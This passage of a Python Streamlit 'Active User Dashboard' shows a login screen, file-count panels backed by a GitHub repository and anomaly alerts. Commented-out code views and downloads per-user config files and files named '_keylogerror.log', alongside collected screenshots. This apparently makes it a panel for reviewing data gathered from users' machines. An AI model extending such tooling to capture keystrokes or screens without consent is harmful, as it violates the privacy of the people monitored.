                #                 # Provide file download option
                #                 st.download_button(label="Download File", data=content, file_name=f"{user}_config.json", mime="application/json", key=f"config_dl_{user}")

                # # Show keylogerror Files
                # show_keylogerror_files = st.sidebar.checkbox("Show Keylogerror files")
                # if show_keylogerror_files:
                #     st.subheader("Keylogerror Files")
                #     filtered_keylogerror_files = {k: v for k, v in keylogerror_user_files.items() if selected_user == "All Users" or selected_user == k}
    
                #     for user, file_url in filtered_keylogerror_files.items():
                #         with st.expander(f"**{user}_keylogerror.log**: Show File Content"):
                #             content = get_file_content(file_url)
                #             if content:
                #                 st.text_area("File Content", content, height=300, disabled=True, key=f"keylogerror_{user}")
    
                #                 st.write(f"[Open File Content]({file_url})")
    
                #                 # Button to open full-screen content
                #                 if st.button(f"View {user} File in Fullscreen", key=f"keylogerror_btn_{user}"):
                #                     st.session_state["fullscreen_content"] = content
                #                     st.session_state["fullscreen_user"] = user
                #                     st.rerun()
    
                #                 # Provide file download option
                #                 st.download_button(label="Download File", data=content, file_name=f"{user}_keylogerror.log", mime="application/log", key=f"keylogerror_dl_{user}")

                # # Fullscreen content view
                # if "fullscreen_content" in st.session_state:
                #     st.subheader(f"Full-screen View: {st.session_state['fullscreen_user']}")
                #     st.text_area("", st.session_state["fullscreen_content"], height=600, disabled=True, key="fullscreen_text")

                
                
                # count files
                show_count_files = st.sidebar.checkbox("Hide Count Files")
                if show_count_files == False:
                    st.header("Count Files")
                    if st.button("Get Number of Files"):
                        st.write("Fetching file counts...")

                    # Use columns to organize the output
                    col1, col2, col3 = st.columns(3)

                    for i, (folder_name, folder_path) in enumerate(FOLDERS.items()):
                        files = get_number_of_files(folder_path)
                        num_files = len(files)  # Calculate the number of files
                        github_url = f"https://github.com/bebedudu/programfeedback/tree/main/upmenu/{folder_path}"

                        # Alternate between columns for better layout
                        if i % 3 == 0:
                            with col1:
                                st.markdown(
                                    f"""
                                    <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
                                        <a href="{github_url}" style="text-decoration: none; color: inherit;">
                                            <h3>{folder_name.capitalize()}</h3>
                                            <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
                                        </a>
                                    </div>
                                    """,
                                    unsafe_allow_html=True
                                )
                        elif i % 3 == 1:
                            with col2:
                                st.markdown(
                                    f"""
                                    <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
                                        <a href="{github_url}" style="text-decoration: none; color: inherit;">
                                            <h3>{folder_name.capitalize()}</h3>
                                            <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
                                        </a>
                                    </div>
                                    """,
                                    unsafe_allow_html=True
                                )
                        else:
                            with col3:
                                st.markdown(
                                    f"""
                                    <div style="padding: 10px; border-radius: 10px; background-color: #212121; margin: 10px 0;">
                                        <a href="{github_url}" style="text-decoration: none; color: inherit;">
                                            <h3>{folder_name.capitalize()}</h3>
                                            <p style="font-size: 24px; font-weight: bold; color: #4a90e2;">{num_files} files</p>
                                        </a>
                                    </div>
                                    """,
                                    unsafe_allow_html=True
                                )





                
                # Display anomalies (if any restricted country detected)
                anomalies = detect_anomalies(user_data)
                if anomalies:
                    st.header("Anomalies Detected")
                    st.warning("⚠️🚨 Anomalies detected in user activity:")
                    
                    # Create DataFrame for better display
                    df = pd.DataFrame(anomalies)[["user", "unique_id", "reason"]]
                    
                    # Remove duplicates based on unique_id
                    df = df.drop_duplicates(subset=["unique_id"])
                    
                    # Display in a table
                    st.table(df)
                else:
                    st.success("✅ No anomalies detected.")
                
                # Add a button to update the data
                st.sidebar.button("Update Data", on_click=fetch_last_10_lines_private, args=(DATA_URL, GITHUB_TOKEN))
                st.sidebar.button("Update Screenshots", on_click=fetch_screenshots)
                
                # Fetch and display GitHub API rate limit information
                limit, remaining_token, reset_time = get_github_rate_limit()
                st.sidebar.warning(f"GitHub API Rate Limit: {limit}, Remaining: {remaining_token}, Reset Time: {reset_time}")
                st.sidebar.markdown("---")  # Add a separator
                st.sidebar.write("© 2025 Bibek 💗. All rights reserved.")
            else:
                st.warning("No user data found!")
            # Polling mechanism to update the dashboard every minute
            
            time.sleep(60)
            parse_active_user_info(lines)
        
         
        dashboard() 

    

    # Tab 5: Download Files
    with tab5:
        st.header("Download Files")
        st.write("Choose an action and configure the options below.")

        # # Advanced options for downloading files
        # download_by_date = st.checkbox("Download Files within Date and Time Range")
        # download_by_num_files = st.checkbox("Download a Specific Number of Files")
        # download_by_user_name = st.checkbox("Download Files by Unique User Name")

        # # Folder-specific options for downloading files
        # download_folder_options = {}
        # for folder_name, folder_path in FOLDERS.items():
        #     with st.expander(f"Folder: {folder_path}"):
        #         # Start Date and Start Time in the same row
        #         col1, col2 = st.columns(2)
        #         with col1:
        #             start_date = st.text_input(f"Start Date (YYYYMMDD) for {folder_name}", key=f"download_start_date_{folder_name}")
        #         with col2:
        #             start_time = st.text_input(f"Start Time (HHMMSS) for {folder_name}", key=f"download_start_time_{folder_name}")

        #         # End Date and End Time in the same row
        #         col3, col4 = st.columns(2)
        #         with col3:
        #             end_date = st.text_input(f"End Date (YYYYMMDD) for {folder_name}", key=f"download_end_date_{folder_name}")
        #         with col4:
        #             end_time = st.text_input(f"End Time (HHMMSS) for {folder_name}", key=f"download_end_time_{folder_name}")

        #         # Number of Files and Unique User Name
        #         if download_by_num_files:
        #             num_files = st.number_input(f"Number of Files to Download for {folder_name}", min_value=1, key=f"download_num_files_{folder_name}")
        #         else:
        #             num_files = None

        #         if download_by_user_name:
        #             unique_user_name = st.text_input(f"Unique User Name for {folder_name}", key=f"download_unique_user_name_{folder_name}")
        #         else:
        #             unique_user_name = None

        #         # Store options in folder-specific dictionary
        #         download_folder_options[folder_name] = {
        #             "start_date": start_date,
        #             "start_time": start_time,
        #             "end_date": end_date,
        #             "end_time": end_time,
        #             "num_files": num_files,
        #             "unique_user_name": unique_user_name
        #         }

        # # Download button for advanced options
        # if st.button("Download Files with Advanced Options"):
        #     if download_by_date or download_by_num_files or download_by_user_name:
        #         # Create a terminal-like output box
        #         terminal_placeholder = st.empty()
        #         terminal_placeholder.markdown(
        #             f"""
        #             <div style="background-color: black; color: white; padding: 10px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll;">
        #                 <pre>Download Log:</pre>
        #             </div>
        #             """,
        #             unsafe_allow_html=True
        #         )

        #         # Initialize or update the session state for download logs
        #         if "download_logs" not in st.session_state:
        #             st.session_state.download_logs = "Download Log:\n"

        #         # Perform download for each folder
        #         for folder_name, folder_path in FOLDERS.items():
        #             # Get folder-specific options
        #             start_date_str = download_folder_options[folder_name]["start_date"]
        #             start_time_str = download_folder_options[folder_name]["start_time"]
        #             end_date_str = download_folder_options[folder_name]["end_date"]
        #             end_time_str = download_folder_options[folder_name]["end_time"]
        #             num_files = download_folder_options[folder_name]["num_files"]
        #             unique_user_name = download_folder_options[folder_name]["unique_user_name"]

        #             # Parse date and time range for the folder
        #             if download_by_date:
        #                 if not start_date_str or not start_time_str or not end_date_str or not end_time_str:
        #                     st.warning(f"Skipping download for {folder_name} because date/time fields are incomplete.")
        #                     continue

        #                 try:
        #                     start_date = datetime.strptime(f"{start_date_str} {start_time_str}", "%Y%m%d %H%M%S")
        #                     end_date = datetime.strptime(f"{end_date_str} {end_time_str}", "%Y%m%d %H%M%S")
        #                 except ValueError:
        #                     st.error(f"Invalid date or time format for {folder_name}. Please use YYYYMMDD for dates and HHMMSS for times.")
        #                     continue
        #             else:
        #                 start_date = end_date = None

        #             # Skip download if no advanced options are selected for this folder
        #             if not download_by_date and not download_by_num_files and not download_by_user_name:
        #                 continue

        #             # Download files with advanced options
        #             download_files_advanced(folder_path, terminal_placeholder, start_date, end_date, num_files, unique_user_name)

        #         st.success("Download completed!")
        #     else:
        #         st.warning("No advanced options selected.")

   
    
    
# Streamlit app
st.set_page_config(page_title="Active User Dashboard", layout="wide", page_icon=":computer:")



# Login Functionality
def login():
    st.title("Login to the Dashboard")
    st.write("Please enter your credentials to access the dashboard.")

    # Login form
    with st.form("login_form"):
        username = st.text_input("Username")
        password = st.text_input("Password", type="password")
        submitted = st.form_submit_button("Login")

        if submitted:
            if authenticate_user(username, password):
                st.session_state["authenticated"] = True
                st.success("Login successful! Redirecting...")
            else:
                st.error("Invalid username or password.")

# Main app logic
if "authenticated" not in st.session_state:
    st.session_state["authenticated"] = False

if not st.session_state["authenticated"]:
    login()
else:
    tabbeddashboard()


# Custom footer
import datetime
current_year = datetime.datetime.now().year
st.markdown(f"""
    <hr>
    <footer style='text-align: center;'>
        © {current_year} Active User Dashboard | Developed by <a href='https://bibekchandsah.com.np' target='_blank' style='text-decoration: none; color: inherit;'>Bibek Chand Sah</a>
    </footer>
""", unsafe_allow_html=True)





